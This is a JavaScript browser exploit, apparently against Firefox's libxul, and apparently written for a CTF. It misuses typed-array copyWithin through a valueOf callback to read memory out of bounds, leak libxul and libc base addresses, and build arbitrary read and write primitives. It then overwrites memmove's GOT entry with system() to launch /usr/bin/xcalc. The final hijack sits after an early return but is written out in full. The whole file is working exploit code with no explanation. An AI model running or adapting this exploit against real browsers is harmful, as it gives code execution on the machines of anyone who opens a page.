var conversion_buffer = new ArrayBuffer(8);
var f64 = new Float64Array(conversion_buffer);
var i32 = new Uint32Array(conversion_buffer);

var BASE32 = 0x100000000;
function f2i(f) {
    f64[0] = f;
    return i32[0] + BASE32 * i32[1];
}

function i2f(i) {
    i32[0] = i % BASE32;
    i32[1] = i / BASE32;
    return f64[0];
}

function hex(addr){
    return '0x'+addr.toString(16);
}
function print(msg) {
    console.log(msg);
    document.body.innerText += '\n[+]: '+msg ;
}


function pwn(){
	buffer1 =  new ArrayBuffer(0x60);
	buffer2 =  new ArrayBuffer(0x60);

	a1_8 = new Uint8Array(buffer1);
	a1_32 = new Uint32Array(buffer1);
	a1_64 = new Float64Array(buffer1);
	a2_8 = new Uint8Array(buffer2);
	a2_32 = new Uint32Array(buffer2);
	a2_64 = new Float64Array(buffer2);

	a1_32[0]=0x61626364;
	a1_32[1]=0x61626364;

	a2_32[0]=0x31323334;
	a2_32[1]=0x31323334;
	
	hax = { valueOf: function() { a1_8.offset = 0x58 ; return 0x0; } };
	a1_8.copyWithin(hax,0x20,0x28);

	xul_base = f2i(a1_64[11]) -0x39b4bf0;
	memmove_got = xul_base + 0x000004b1f160
	print("xul_base "+hex(xul_base));
	// 0x7fffecae9160
	print("memmove_got "+hex(memmove_got));

	a1_8.offset = 0;
	a1_8.copyWithin(hax,0x28,0x30);
	buffer1_base = f2i(a1_64[11])*2 - 0xe0;
	print("buffer1_base "+hex(buffer1_base));

	a1_8.offset = 0;
	hax = { valueOf: function() { a1_8.offset = 0x58 ; return 0x28; } };
	a2_64[0]=i2f(buffer1_base/2);
	a1_8.copyWithin(hax,0x48,0x50);
	print(hex(f2i(a2_64[0])));



	// leak libc addr
	function read64(addr){
		a2_32 = new Uint32Array(buffer2);
		a2_64 = new Float64Array(buffer2);
		a2_32[10]=0x1000;
		a2_64[4]=i2f(addr/2);
		leak = new Float64Array(buffer1);
		return f2i(leak[0]);
	}
	function write64(addr,data){
		a2_32 = new Uint32Array(buffer2);
		a2_64 = new Float64Array(buffer2);
		a2_32[10]=0x1000;
		a2_64[4]=i2f(addr/2);
		towrite = new Float64Array(buffer1);
		towrite[0] = i2f(data);
	}
	memmove_addr =  read64(memmove_got) ;
	libc_base =  memmove_addr -  0x14d9b0;
	system_addr = libc_base + 0x0000000000045390;
	print("libc_base "+hex(libc_base));
	print("system_addr "+hex(system_addr));

	return 0;
	var target = new Uint8Array(100);
	var cmd = "/usr/bin/xcalc";
	for (var i = 0; i < cmd.length; i++) {
        	target[i] = cmd.charCodeAt(i);
    	}
	target[cmd.length]=0;
	write64(memmove_got,system_addr);
	target.copyWithin(0, 1);
	write64(memmove_got,memmove_addr);

}

